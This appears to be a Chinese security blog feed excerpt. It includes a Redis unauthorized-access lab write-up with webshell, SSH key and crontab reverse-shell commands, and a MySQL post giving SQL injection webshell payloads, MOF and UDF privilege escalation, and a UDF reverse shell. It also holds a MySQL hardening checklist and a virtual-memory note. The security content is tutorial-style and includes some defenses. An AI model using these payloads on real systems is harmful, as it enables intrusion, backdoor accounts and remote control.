plugin</span><br></pre></td></tr></table></figure><p>设置为mysql_old_password代表弱hash算法，可以快速通过密码字典进行暴力破解。使用如下命令查询相关值：</p><p>SHOW VARIABLES WHERE Variable_name = ‘old_passwords’;</p><p>确保返回值不为1。</p><h3 id="2-secure-auth-选项设置"><a href="#2-secure-auth-选项设置" class="headerlink" title="2. secure_auth 选项设置"></a>2. secure_auth 选项设置</h3><p>如果客户端采用Old_passwords发起连接请求，如果服务器端设置了secure_auth，则客户端会拒绝连接请求，可以根据安全需求在配置文件中做相应配置。</p><h3 id="3-密码保存"><a href="#3-密码保存" class="headerlink" title="3. 密码保存"></a>3. 密码保存</h3><p>确保密码没有明文保存在全局配置文件中。</p><h3 id="4-确保所有用户都要求使用非空密码登录"><a href="#4-确保所有用户都要求使用非空密码登录" class="headerlink" title="4. 确保所有用户都要求使用非空密码登录"></a>4. 确保所有用户都要求使用非空密码登录</h3><p>执行如下语句查询是否有用户不需要密码即可登录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT User,host</span><br><span class="line">FROM mysql.user</span><br><span class="line">WHERE (plugin IN(&apos;mysql_native_password&apos;, &apos;mysql_old_password&apos;)</span><br><span class="line">AND (LENGTH(Password) = 0</span><br><span class="line">OR Password IS NULL))</span><br><span class="line">OR (plugin=&apos;sha256_password&apos; AND LENGTH(authentication_string) = 0);</span><br></pre></td></tr></table></figure><h3 id="5-不存在空账号"><a href="#5-不存在空账号" class="headerlink" title="5. 不存在空账号"></a>5. 不存在空账号</h3><p>使用如下命令查询是否存在空账号：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT user,host FROM mysql.user WHERE user = &apos;&apos;;</span><br></pre></td></tr></table></figure><h2 id="0x08-网络设置"><a href="#0x08-网络设置" class="headerlink" title="0x08 网络设置"></a>0x08 网络设置</h2><p>如果mysql数据库服务器与应用是跨信任域部署的，则需要考虑在数据库服务器与应用服务器之间建立ssl通道进行数据传输，不过这种场景一般很少见，在此不详细描述。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;MySQL安全配置&quot;&gt;&lt;a href=&quot;#MySQL安全配置&quot; class=&quot;headerlink&quot; title=&quot;MySQL安全配置&quot;&gt;&lt;/a&gt;MySQL安全配置&lt;/h1&gt;&lt;p&gt;本文转载自 &lt;a href=&quot;https://blog.csdn.net/ilnat
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Redis未授权访问</title>
    <link href="http://bai-ren-1.github.io/2020/03/03/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
    <id>http://bai-ren-1.github.io/2020/03/03/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</id>
    <published>2020-03-03T08:30:25.000Z</published>
    <updated>2020-03-03T09:24:07.686Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Redis未授权访问"><a href="#Redis未授权访问" class="headerlink" title="Redis未授权访问"></a>Redis未授权访问</h1><p>很简单的内容，这里只做第一个实验。后面的实验做法网上很多。通过三种攻击介绍Redis未授权访问的利用。</p><h2 id="Redis写Webshell"><a href="#Redis写Webshell" class="headerlink" title="Redis写Webshell"></a>Redis写Webshell</h2><p>首先在靶机Ubuntu和攻击机Kali上都配置Redis环境。查看一下两台机器的ip环境，靶机的ip为192.168.3.74：</p><p><img src="/2020/03/03/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/ubuntu%E7%9A%84ip.png" alt></p><p>攻击机的ip为：192.168.3.66：</p><p><img src="/2020/03/03/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/kali%E7%9A%84ip.png" alt></p><p>在靶机上开启我们的Redis服务：</p><p><img src="/2020/03/03/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/ubuntu%E5%BC%80%E6%9C%8D%E5%8A%A1.png" alt></p><p>然后我们在攻击机上通过命令连接redis服务：</p><p><img src="/2020/03/03/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/kali%E8%BF%9E%E6%8E%A5.png" alt></p><p>可以看到我们能连接到Redis服务器上，Redis的服务是暴露在外的。那么不多说直接设置目录然后写入shell：</p><p><img src="/2020/03/03/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/%E5%86%99%E5%85%A5shell.png" alt></p><p>然后就可以在靶机上看到了被植入了一个Webshell：</p><p><img src="/2020/03/03/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/%E5%86%99%E5%85%A5.png" alt></p><p>第一个实验写入Webshell到此成功执行。</p><h2 id="Redis写SSH公钥"><a href="#Redis写SSH公钥" class="headerlink" title="Redis写SSH公钥"></a>Redis写SSH公钥</h2><p>首先我们在攻击机上生成公私钥对，passphrase设置为空：</p><p><img src="/2020/03/03/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/kali%E7%94%9F%E6%88%90%E5%85%AC%E9%92%A5.png" alt></p><p>我们把公钥写入一个文件1.txt中：</p><p><img src="/2020/03/03/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6.png" alt></p><p>攻击机连接到靶机并把保存公钥的1.txt写入Redis中：</p><p><img src="/2020/03/03/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/%E8%AE%BE%E7%BD%AE%E5%85%AC%E9%92%A5.png" alt></p><p>使用命令得到Redis的路径后修改到SSH公钥保存的目录：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">192.168.3.74:6379&gt; CONFIG GET dir</span><br><span class="line">1)"dir"</span><br><span class="line">2)"/home/chenxiaoyi"</span><br><span class="line">192.168.3.74:6379&gt; CONFIG SET dir /root/.ssh</span><br><span class="line">OK</span><br><span class="line">192.168.3.74:6379&gt; CONFIG SET dbfilename authorized_keys</span><br><span class="line">OK</span><br><span class="line">192.168.3.74:6379&gt; CONFIG GET dbfilename</span><br><span class="line">1)"dbfilename"</span><br><span class="line">2)"authorized_keys"</span><br><span class="line">192.168.3.74:6379&gt; SAVE</span><br><span class="line">OK</span><br><span class="line">192.168.3.74:6379&gt; EXIT</span><br></pre></td></tr></table></figure><p>然后我们退出连接后再在攻击机里面用SSH来连接到靶机：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa root@192.168.3.74</span><br></pre></td></tr></table></figure><h2 id="Redis利用crontab反弹shell"><a href="#Redis利用crontab反弹shell" class="headerlink" title="Redis利用crontab反弹shell"></a>Redis利用crontab反弹shell</h2><p>这个就不进行实验了，贴一下代码。首先在攻击机上开启监听：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure><p>然后连接到Redis后并写入反弹shell：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.3.74</span><br><span class="line">set xxx "\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.3.66/4444 0&gt;&amp;1\n</span><br></pre></td></tr></table></figure><p>然后执行下面命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">192.168.3.74:6379&gt; CONFIG SET dir /var/spool/cron</span><br><span class="line">OK</span><br><span class="line">192.168.3.74:6379&gt; CONFIG SET dbfilename root</span><br><span class="line">OK</span><br><span class="line">192.168.3.74:6379&gt; SAVE</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><p>最后在攻击机上就能收到一个shell。</p><blockquote><p>这里介绍一下crontab –  使用定时任务来反弹shell：</p><ul><li>系统任务调度文件</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/crontab</span><br></pre></td></tr></table></figure><ul><li>用户 XXX 调度文件</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ubuntu 下路径</span><br><span class="line">/var/spool/cron/crontabs/xxx</span><br><span class="line"></span><br><span class="line">Alpine 下路径</span><br><span class="line">/etc/cron.d/xxx</span><br><span class="line"></span><br><span class="line">debian 下的路径（xxx 可以是任意东西）</span><br><span class="line">/etc/cron.d/xxx</span><br><span class="line">或者</span><br><span class="line">/var/spool/cron/crontabs/xxx</span><br><span class="line">但是写这个路径的时候，文件内不能加用户名。</span><br></pre></td></tr></table></figure></blockquote><h2 id="防御手段"><a href="#防御手段" class="headerlink" title="防御手段"></a>防御手段</h2><ul><li><p>采用绑定IP的方式来进行控制</p><p>请在redis.conf文件找到如下配置</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`<span class="comment"># If you want you can bind a single interface, if the bind option is not``# specified all the interfaces will listen for incoming connections.``#``# bind 127.0.0.1`</span></span><br></pre></td></tr></table></figure><p>把 #bind 127.0.0.1前面的注释#号去掉，然后把127.0.0.1改成你允许访问你的redis服务器的ip地址，表示只允许该ip进行访问，这种情况下，我们在启动redis服务器的时候不能再用:redis-server，改为:redis-server path/redis.conf 即在启动的时候指定需要加载的配置文件,其中path/是你上面修改的redis配置文件所在目录，这个方法有一点不太好，我难免有多台机器访问一个redis服务。</p><ul><li>设置密码，以提供远程登陆</li></ul><p>打开redis.conf配置文件，找到requirepass，然后修改如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`requirepass yourpassword``yourpassword就是redis验证密码，设置密码以后发现可以登陆，但是无法执行命令了。`` ` `命令如下:``redis-cli -h yourIp -p yourPort``//启动redis客户端，并连接服务器``keys * ``//输出服务器中的所有key``报错如下``(error) ERR operation not permitted`` ` `这时候你可以用授权命令进行授权，就不报错了`` ` `命令如下:``auth youpassword`</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>渗透中可以多扫描一下6379的Redis端口，是个很好利用的点。然后要学会Redis的正确配置，防止被人攻下。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://www.cnblogs.com/bmjoker/p/9548962.html" target="_blank" rel="noopener">https://www.cnblogs.com/bmjoker/p/9548962.html</a> </li><li><a href="https://nightmorning.site/wordpress/?p=755" target="_blank" rel="noopener">https://nightmorning.site/wordpress/?p=755</a> </li><li><a href="https://www.cnblogs.com/v1vvwv/p/how-to-use-crontab-to-getshell.html" target="_blank" rel="noopener">https://www.cnblogs.com/v1vvwv/p/how-to-use-crontab-to-getshell.html</a> </li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Redis未授权访问&quot;&gt;&lt;a href=&quot;#Redis未授权访问&quot; class=&quot;headerlink&quot; title=&quot;Redis未授权访问&quot;&gt;&lt;/a&gt;Redis未授权访问&lt;/h1&gt;&lt;p&gt;很简单的内容，这里只做第一个实验。后面的实验做法网上很多。通过三种攻击介绍R
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>MYSQL提权</title>
    <link href="http://bai-ren-1.github.io/2020/03/02/MYSQL%E6%8F%90%E6%9D%83/"/>
    <id>http://bai-ren-1.github.io/2020/03/02/MYSQL%E6%8F%90%E6%9D%83/</id>
    <published>2020-03-02T07:58:51.000Z</published>
    <updated>2020-03-04T02:54:54.141Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MYSQL写Webshell"><a href="#MYSQL写Webshell" class="headerlink" title="MYSQL写Webshell"></a>MYSQL写Webshell</h1><p>写Webshell比较常见的方法有：</p><ul><li>select … into outfile</li><li>general_log</li></ul><hr><h2 id="select-…-into-outfile"><a href="#select-…-into-outfile" class="headerlink" title="select … into outfile"></a>select … into outfile</h2><h3 id="1-利用条件"><a href="#1-利用条件" class="headerlink" title="1.利用条件"></a>1.利用条件</h3><ul><li>对web目录有写权限</li><li>GPC关闭（能使用单引号）</li><li>有绝对路径（读文件可以不用，写文件必须）</li><li>没有配置 <code>–secure-file-priv</code></li></ul><h3 id="2-利用方式"><a href="#2-利用方式" class="headerlink" title="2.利用方式"></a>2.利用方式</h3><ul><li>有 <code>union</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=2) union select 1,2,3,4,5,6,7,&apos;&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;’ into outfile ‘/home/wwwroot/shadowyspirits/evil.php’%23</span><br><span class="line">1</span><br></pre></td></tr></table></figure><ul><li>无 <code>union</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=2) into outfile ‘/home/wwwroot/shadowyspirits/evil.php’ fields terminated by ‘&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;’%23</span><br><span class="line">1</span><br></pre></td></tr></table></figure><p>其中 <code>fields terminated by</code> 是用来指定列之间分隔符，如果查询结果为单列则不会插入分隔符，所以必须有多个列才能成功写入一句话。</p><hr><h2 id="general-log"><a href="#general-log" class="headerlink" title="general_log"></a>general_log</h2><h4 id="1-利用条件-1"><a href="#1-利用条件-1" class="headerlink" title="1.利用条件"></a>1.利用条件</h4><ul><li>对web目录有写权限</li><li>GPC关闭（能使用单引号）</li><li>有绝对路径（读文件可以不用，写文件必须）</li><li>需要能执行多行sql语句</li></ul><h3 id="2-利用方式-1"><a href="#2-利用方式-1" class="headerlink" title="2.利用方式"></a>2.利用方式</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set <span class="keyword">global</span> general_log=<span class="string">'on'</span>;</span><br><span class="line">SET <span class="keyword">global</span> general_log_file=<span class="string">'/home/wwwroot/shadowyspirits/evil.php'</span>;</span><br><span class="line">SELECT <span class="string">'&lt;?php assert($_POST["cmd"]);?&gt;'</span>;</span><br></pre></td></tr></table></figure><p>设置了 <code>general_log</code> 和 <code>general_log_file</code> 之后所有SQL记录都会写入指定的文件，所以会导致 log 文件非常大，推荐只暂时打开</p><p>需要注意的是 <code>secure_file_priv</code> 是只读属性，如果试图使用 <code>set global</code> 修改会报如下 Error</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error Code: 1238. Variable &apos;secure_file_priv&apos; is a read only</span><br></pre></td></tr></table></figure><h2 id="防御姿势"><a href="#防御姿势" class="headerlink" title="防御姿势"></a>防御姿势</h2><ul><li>设置 <code>secure_file_prive = null</code> （不允许导入和导出）</li><li>防止暴露网站绝对路径</li><li>正确设置 web 目录权限，除 log、upload 等目录外不授予写权限，upload </li><li>目录不授予执行权限</li></ul><hr><h1 id="MYSQL提权"><a href="#MYSQL提权" class="headerlink" title="MYSQL提权"></a>MYSQL提权</h1><p>MYSQL提权一般有三种方法：</p><ul><li>mof提权</li><li>udf提权</li><li>反弹shell</li></ul><hr><h2 id="mof提权"><a href="#mof提权" class="headerlink" title="mof提权"></a>mof提权</h2><h3 id="1-原理"><a href="#1-原理" class="headerlink" title="1.原理"></a>1.原理</h3><p>在windows平台下，<code>c:/windows/system32/wbem/mof/nullevt.mof</code>这个文件会每间隔一段时间（很短暂）就会以system权限执行一次，所以，只要我们将我们先要做的事通过代码存储到这个mof文件中，就可以实现权限提升。</p><h3 id="2-利用条件"><a href="#2-利用条件" class="headerlink" title="2.利用条件"></a>2.利用条件</h3><ul><li>mysql用户具有root权限(对上面那个目录可写）</li><li>关闭了<code>secure-file-priv</code></li></ul><h3 id="3-利用方式"><a href="#3-利用方式" class="headerlink" title="3.利用方式"></a>3.利用方式</h3><p>下面是一段写好了的mof利用代码</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#pragma namespace("\\\\.\\root\\subscription") </span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123; </span><br><span class="line">EventNamespace = "Root\\Cimv2"; </span><br><span class="line">Name  = "filtP2"; </span><br><span class="line">    Query = "Select \ From __InstanceModificationEvent "  </span><br><span class="line">            "Where TargetInstance Isa \"Win32_LocalTime\" " </span><br><span class="line">            "And TargetInstance.Second = <span class="number">5</span>"; </span><br><span class="line">QueryLanguage = "WQL"; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer </span><br><span class="line">&#123; </span><br><span class="line">    Name = "consPCSV2"; </span><br><span class="line">ScriptingEngine = "JScript"; </span><br><span class="line">ScriptText = "var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"<span class="built_in">net</span>.exe user admin admin /add")"; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123; </span><br><span class="line">    Consumer   = $Consumer;  </span><br><span class="line">    Filter = $EventFilter; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这段代码只是在目标系统上添加了一个admin用户，并没有添加到管理员组（如果需要自行查找，网上很多），将这个文件存储为<code>nullevt.mof</code>上传到任意一个你在目标机上可写的路径(当然，如果你直接可以写到<code>c:/windows/system32/wbem/mof/</code>就更好了)，接下来我们就可以直接执行sql语句把该文件写入到目标路径：</p><p>这段代码只是在目标系统上添加了一个admin用户，并没有添加到管理员组（如果需要自行查找，网上很多），将这个文件存储为nullevt.mof上传到任意一个你在目标机上可写的路径(当然，如果你直接可以写到c:/windows/system32/wbem/mof/就更好了)，接下来我们就可以直接执行sql语句把该文件写入到目标路径：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&apos;你上传的路径/nullevt.mof&apos;) into dumpfile &apos;c:/windows/system32/wbem/mof/nullevt.mof&apos;;</span><br></pre></td></tr></table></figure><p>执行完后，你可以在你的webshell里执行使用net user查看是否多了一个admin用户，如果有则说明可以利用，否则就不需要继续了。</p><hr><h2 id="udf提权"><a href="#udf提权" class="headerlink" title="udf提权"></a>udf提权</h2><h3 id="1-原理-1"><a href="#1-原理-1" class="headerlink" title="1.原理"></a>1.原理</h3><p>UDF提权是利用MYSQL的自定义函数功能，将MYSQL账号转化为系统system权限</p><h3 id="2-利用条件-1"><a href="#2-利用条件-1" class="headerlink" title="2.利用条件"></a>2.利用条件</h3><ul><li>Mysql版本大于5.1版本udf.dll文件必须放置于MYSQL安装目录下的<code>lib\plugin</code>文件夹下。</li><li>Mysql版本小于5.1版本。udf.dll文件在Windows2003下放置于<code>c:\windows\system32</code>，在windows2000下放置于c:\winnt\system32。</li><li>掌握的mysql数据库的账号有对mysql的insert和delete权限以创建和抛弃函数，一般以root账号为佳，具备`root账号所具备的权限的其它账号也可以。</li><li>可以将udf.dll写入到相应目录的权限。</li></ul><blockquote><p>注：关于plugin目录，可在mysql中执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &apos;%plugin%&apos;;</span><br></pre></td></tr></table></figure><p>进行查看，这个目录也就是dll文件需要导入的目录</p></blockquote><h3 id="3-利用方式-1"><a href="#3-利用方式-1" class="headerlink" title="3.利用方式"></a>3.利用方式</h3><ul><li>将dll文件导入到相应目录，如果导入错误会产生<code>cant open shared library</code>错误</li><li>创建自定义函数</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create function cmdshell returns string soname &apos;udf.dll&apos;;</span><br><span class="line">select cmdshell(&apos;net user miao zjicmisa.org /add&apos;);</span><br><span class="line">select cmdshell(&apos;net localgroup administrators miao /add&apos;);</span><br><span class="line">drop function cmdshell; 删除函数</span><br><span class="line">delete from mysql.func where name=&apos;cmdshell&apos;  删除函数</span><br></pre></td></tr></table></figure><blockquote><p>注意这里的函数名应该与dll文件中的函数名一致。</p></blockquote><p>当然关于udf有一个特别需要注意的问题，就是5.1以上版本默认情况下<code>/lib/plugin</code>目录是不存在的，还好有大牛已经想出了解决办法——<code>NTFS ADS流</code>来创建文件夹（该方法我们测试过）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select @@basedir;   </span><br><span class="line">//查找到mysql的目录</span><br><span class="line">select &apos;It is dll&apos; into dumpfile &apos;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION&apos;;   </span><br><span class="line">//利用NTFS ADS创建lib目录</span><br><span class="line">select &apos;It is dll&apos; into dumpfile &apos;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION&apos;;</span><br><span class="line">//利用NTFS ADS创建plugin目录</span><br></pre></td></tr></table></figure><blockquote><p>注：udf提权也是一般应用于win2000、win2003系统</p></blockquote><hr><h2 id="反弹shell提权"><a href="#反弹shell提权" class="headerlink" title="反弹shell提权"></a>反弹shell提权</h2><p>其实这也属于udf提权，只不过应用场景不同，比如现在我们没有webshell但是我们却有偶然得到了mysql的root密码（弱口令等），恰巧目标机的数据库可以外联或者有phpmyadmin，那么我们就可以把上面<code>udf.dll</code>文件的内容先插入到数据表中，然后再导出到<code>/lib/plugin</code>目录。</p><blockquote><p>注：这里我看到网上的资料都是讲mysql.txt导入到数据库中，mysql.txt也就是udf.dll文件的2进制转换为16进制，这里我不太清楚为什么需要转成十六进制，但是我知道如果udf.dll文件成功导入到plugin目录是可以成功反弹shell的</p></blockquote><ul><li>创建函数backshell</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE FUNCTION backshell RETURNS STRING SONAME &apos;mysqldll.dll&apos;; //创建backshell</span><br></pre></td></tr></table></figure><ul><li>在具备独立主机的服务器上执行监听</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -vv -l -p 12345</span><br></pre></td></tr></table></figure><ul><li>执行backshell</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select backshell("你的ip地址",12345);</span><br></pre></td></tr></table></figure><p>但是我是通过webshell将udf.dll导入plugin目录完成的，如果成功返回了shell则说明成功了，我们就可以添加用户了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;MYSQL写Webshell&quot;&gt;&lt;a href=&quot;#MYSQL写Webshell&quot; class=&quot;headerlink&quot; title=&quot;MYSQL写Webshell&quot;&gt;&lt;/a&gt;MYSQL写Webshell&lt;/h1&gt;&lt;p&gt;写Webshell比较常见的方法有：&lt;/p&gt;
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>物理内存和虚拟内存的联系与区别</title>
    <link href="http://bai-ren-1.github.io/2020/02/13/%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E5%92%8C%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%9A%84%E8%81%94%E7%B3%BB%E4%B8%8E%E5%8C%BA%E5%88%AB/"/>
    <id>http://bai-ren-1.github.io/2020/02/13/%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E5%92%8C%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%9A%84%E8%81%94%E7%B3%BB%E4%B8%8E%E5%8C%BA%E5%88%AB/</id>
    <published>2020-02-13T03:31:44.000Z</published>
    <updated>2020-02-21T08:02:19.015Z</updated>
    
    <content type="html"><![CDATA[<h1 id="虚拟内存与物理内存的联系与区别"><a href="#虚拟内存与物理内存的联系与区别" class="headerlink" title="虚拟内存与物理内存的联系与区别"></a>虚拟内存与物理内存的联系与区别</h1><p>重要的概念，需要弄清楚。</p><h2 id="物理内存与虚拟内存"><a href="#物理内存与虚拟内存" class="headerlink" title="物理内存与虚拟内存"></a>物理内存与虚拟内存</h2><p>操作系统有虚拟内存与物理内存的概念。</p><p>在很久以前，还没有虚拟内存概念的时候，程序寻址用的都是物理地址。程序能寻址的范围是有限的，这取决于CPU的地址线条数。比如在<strong>32位平台下，寻址的范围是2^32也就是4G</strong>。并且这是固定的，如果没有虚拟内存，且每次开启一个进程都给4G的物理内存，就可能会出现很多问题：</p><ul><li>因为我的物理内存时有限的，当有多个进程要执行的时候，都要给4G内存，很显然你内存小一点，这很快就分配完了，于是没有得到分配资源的进程就只能等待。当一个进程执行完了以后，再将等待的进程装入内存。这种频繁的装入内存的操作是很没效率的</li><li>由于指令都是直接访问物理内存的，那么我这个进程就可以修改其他进程的数据，甚至会修改内核地址空间的数据，这是我们不想看到的</li><li>因为内存时随机分配的，所以程序运行的地址也是不正确的。</li></ul><p>针对上面会出现的各种问题，虚拟内存就出来了。</p><p>在之前一篇文章中进程分配资源介绍过一个进程运行时都会得到4G的虚拟内存。这个虚拟内存你可以认为，每个进程都<strong>认为</strong>自己拥有4G的空间，这只是每个进程认为的，但是实际上，在虚拟内存对应的物理内存上，可能只对应的<strong>一点点</strong>的物理内存，实际用了多少内存，就会对应多少物理内存。</p><p>进程得到的这4G虚拟内存是一个连续的地址空间（这也只是进程认为），而实际上，它通常是被分隔成多个物理内存碎片，还有一部分存储在外部磁盘存储器上，在需要时进行<strong>数据交换</strong>。</p><p>进程开始要访问一个地址，它可能会经历下面的过程</p><ol><li>每次我要访问地址空间上的某一个地址，都需要把地址翻译为实际物理内存地址</li><li>所有进程共享这整一块物理内存，每个进程只把自己目前需要的虚拟地址空间映射到物理内存上</li><li>进程需要知道哪些地址空间上的数据在物理内存上，哪些不在（可能这部分存储在磁盘上），还有在物理内存上的哪里，这就需要通过页表来记录</li><li>页表的每一个表项分两部分，第一部分记录此页是否在物理内存上，第二部分记录物理内存页的地址（如果在的话）</li><li>当进程访问某个虚拟地址的时候，就会先去看页表，如果发现对应的数据不在物理内存上，就会发生缺页异常<br>缺页异常的处理过程，操作系统立即阻塞该进程，并将硬盘里对应的页换入内存，然后使该进程就绪，如果内存已经满了，没有空地方了，那就找一个页覆盖，至于具体覆盖的哪个页，就需要看操作系统的页面置换算法是怎么设计的了。</li></ol><p><strong>关于虚拟内存与物理内存的联系如下图：</strong></p><p><img src="/2020/02/13/%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E5%92%8C%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%9A%84%E8%81%94%E7%B3%BB%E4%B8%8E%E5%8C%BA%E5%88%AB/linux%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98.png" alt></p><p><strong>页表的工作原理如下图：</strong></p><p><img src="/2020/02/13/%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E5%92%8C%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%9A%84%E8%81%94%E7%B3%BB%E4%B8%8E%E5%8C%BA%E5%88%AB/%E7%BD%AE%E6%8D%A2%E5%B7%A5%E4%BD%9C%E8%BF%87%E7%A8%8B.png" alt></p><ol><li>我们的cpu想访问虚拟地址所在的虚拟页(VP3)，根据<strong>页表</strong>，找出页表中第三条的值.判断有效位。 